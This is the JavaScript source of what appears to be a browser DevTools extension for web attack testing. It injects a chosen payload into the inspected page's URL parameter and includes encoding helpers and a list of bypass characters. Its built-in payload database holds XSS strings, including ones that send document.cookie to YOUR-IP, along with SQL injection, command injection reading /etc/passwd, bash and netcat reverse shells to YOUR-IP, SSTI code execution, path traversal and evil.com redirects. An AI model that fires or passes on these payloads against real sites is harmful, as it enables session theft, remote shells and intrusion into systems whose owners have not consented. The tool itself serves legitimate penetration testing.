document.addEventListener("DOMContentLoaded", () => {

  const payload = document.getElementById("payload");
  const injectBtn = document.getElementById("injectBtn");
  const bypass = document.getElementById("bypass");
  const urlCodeBtn = document.getElementById("urlCode");
  const base64Btn = document.getElementById("base64");
  const hexCodeBtn = document.getElementById("hexCode");
  const modeBox = document.getElementById("modeBox");
  const typeBox = document.getElementById("typeBox");
  const payloadBox = document.getElementById("payloadBox");

  /* ---------- AUTO GROW ---------- */
  function autoGrow(el) {
    el.style.height = "auto";
    el.style.height = el.scrollHeight + "px";
  }
  payload.addEventListener("input", () => autoGrow(payload));

  /* ---------- SAFE COPY ---------- */
  function copyText(text) {
    const t = document.createElement("textarea");
    t.value = text;
    document.body.appendChild(t);
    t.select();
    document.execCommand("copy");
    document.body.removeChild(t);
  }

  /* ---------- INJECT ---------- */
  injectBtn.onclick = () => {
    const p = payload.value.trim();
    if (!p) return;
    chrome.devtools.inspectedWindow.eval(`
      (function(){
        const payload=${JSON.stringify(p)};
        let u=new URL(location.href);
        let k=[...u.searchParams.keys()];
        if(k.length){
          u.searchParams.set(k[0],payload);
          location.href=u.toString();
        }
      })();
    `);
    copyText(p);
  };

  /* ---------- SELECTION TRANSFORM ---------- */
  function transform(fn) {
    let s = payload.selectionStart, e = payload.selectionEnd;
    if (s === e) return;
    const out = fn(payload.value.slice(s, e));
    payload.value = payload.value.slice(0, s) + out + payload.value.slice(e);
    payload.selectionStart = s;
    payload.selectionEnd = s + out.length;
    autoGrow(payload);
  }

  /* ---------- URL TOGGLE ---------- */
  urlCodeBtn.onclick = () => transform(s => {
    if (/%[0-9A-Fa-f]{2}/.test(s)) {
      try {
        let d = s;
        while (d.includes('%')) {
          let n = decodeURIComponent(d);
          if (n === d) break;
          d = n;
        }
        return d;
      } catch { return s; }
    }
    return s.split('').map(c => '%' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('').toUpperCase();
  });

  /* ---------- BASE64 TOGGLE ---------- */
  base64Btn.onclick = () => transform(s => {
    const b64Regex = /^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$/;
    if (b64Regex.test(s) && s.length > 3) {
      try { return decodeURIComponent(escape(atob(s))); } catch { }
    }
    return btoa(unescape(encodeURIComponent(s)));
  });

  /* ---------- HEX TOGGLE ---------- */
  hexCodeBtn.onclick = () => transform(s => {
    const isHex = /^[0-9A-Fa-f\s]+$/.test(s) && s.length % 2 === 0;
    if (isHex) {
      try {
        const clean = s.replace(/\s+/g, '');
        let res = '';
        for (let i = 0; i < clean.length; i += 2) {
          res += String.fromCharCode(parseInt(clean.substr(i, 2), 16));
        }
        return res;
      } catch { }
    }
    return s.split('').map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
  });

  /* ---------- BYPASS ---------- */
  ["'", '"', '`', '\\', '/', '<', '>', '#', ';', '|', '&', '&&', '||',
    '%00', '%0a', '%0d', '%09', '%20', '$()', '${}', '%3c', '%3e', '/">'
  ].forEach(c => {
    const b = document.createElement("span");
    b.className = "badge bypass";
    b.textContent = c;
    b.onclick = () => copyText(c);
    bypass.appendChild(b);
  });

  /* ---------- PAYLOAD DATABASE ---------- */
  const PAYLOAD_DB = {
    xss: {
      basic: ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>", "<body onload=alert(1)>", "<details open ontoggle=alert(1)>"],
      blind: ["<script src=http://YOUR-IP/x.js></script>", "<img src=x onerror=this.src='http://YOUR-IP/?c='+document.cookie>", "<svg/onload=fetch('http://YOUR-IP/'+btoa(document.cookie))>"],
      dom: ["\";alert(1);//", "';alert(1);//", "javascript:alert(1)", "#<img src=x onerror=alert(1)>", "data:text/html,<svg/onload=alert(1)>"],
      filter: ["<scr<script>ipt>alert(1)</scr<script>ipt>", "<svg><script>alert(1)</script></svg>", "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>"]
    },
    sqli: {
      basic: ["' OR '1'='1'-- -", "' OR 1=1-- -", "\" OR \"1\"=\"1\"-- -"],
      union: ["' UNION SELECT 1,2,3-- -", "' UNION SELECT null,null-- -"],
      error: ["' AND updatexml(1,concat(0x7e,user()),1)-- -", "' AND extractvalue(1,concat(0x7e,version()))-- -"],
      time: ["' AND sleep(5)-- -", "' OR IF(1=1,sleep(5),0)-- -"]
    },
    cmd: {
      basic: [";id", "|id", "$(id)", "`id`"],
      read: [";cat /etc/passwd", ";ls -la /", "|whoami"],
      blind: [";sleep 5", "|ping -c 5 127.0.0.1"],
      reverse: ["bash -i >& /dev/tcp/YOUR-IP/4444 0>&1", "nc YOUR-IP 4444 -e /bin/bash"]
    },
    ssti: {
      basic: ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"],
      rce: ["{{self.__init__.__globals__.os.popen('id').read()}}", "{{cycler.__init__.__globals__.os.popen('whoami').read()}}"]
    },
    lfi: {
      basic: ["../../../../../etc/passwd", "../../../../proc/self/environ", "/etc/passwd%00"],
      log: ["../../../../var/log/nginx/access.log", "../../../../var/log/apache2/access.log"]
    },
    redirect: {
      basic: ["//evil.com", "https://evil.com", "/\\evil.com"]
    }
  };

  /* ---------- RENDER LOGIC ---------- */
  function renderTypes(m) {
    typeBox.innerHTML = "";
    payloadBox.innerHTML = "";
    Object.keys(PAYLOAD_DB[m]).forEach((t, i) => {
      const b = document.createElement("span");
      b.className = "badge type";
      b.textContent = t;
      if (i === 0) b.classList.add("active");
      b.onclick = () => {
        typeBox.querySelectorAll(".badge.type").forEach(x => x.classList.remove("active"));
        b.classList.add("active");
        renderPayloads(m, t);
      };
      typeBox.appendChild(b);
    });
  }

  function renderPayloads(m, t) {
    payloadBox.innerHTML = "";
    PAYLOAD_DB[m][t].forEach(p => {
      const d = document.createElement("div");
      d.className = "badge payload";
      d.textContent = p;
      d.onclick = () => {
        payload.value = p;
        autoGrow(payload);
        copyText(p);
      };
      payloadBox.appendChild(d);
    });
  }

  Object.keys(PAYLOAD_DB).forEach((m, i) => {
    const b = document.createElement("span");
    b.className = "badge mode";
    b.dataset.mode = m;
    b.textContent = m.toUpperCase();
    if (i === 0) b.classList.add("active");
    b.onclick = () => {
      modeBox.querySelectorAll(".badge.mode").forEach(x => x.classList.remove("active"));
      b.classList.add("active");
      renderTypes(m);
    };
    modeBox.appendChild(b);
    if (i === 0) renderTypes(m);
  });
});
